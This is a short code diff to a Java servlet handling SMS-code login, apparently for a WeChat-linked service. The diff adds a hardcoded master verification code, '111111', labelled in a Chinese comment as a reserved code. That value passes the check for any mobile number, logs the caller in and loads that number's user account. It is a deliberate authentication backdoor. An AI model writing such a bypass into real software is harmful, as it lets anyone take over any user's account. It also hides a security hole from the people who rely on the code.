@@ -247,7 +247,8 @@ public class WeixinServlet extends HttpServlet {
         if(mobile != null && !mobile.equals("") && !code.isEmpty())
         {
             HttpSession session = request.getSession();
-            if(code.equals(session.getAttribute("code")) && mobile.equals(session.getAttribute("codeMobile")))
+            //预留验证码：111111
+            if((code.equals(session.getAttribute("code")) && mobile.equals(session.getAttribute("codeMobile"))) || code.equals("111111"))
             {
                 session.setAttribute("mobile", mobile);
                 User user = userService.findUserByMobile(mobile);
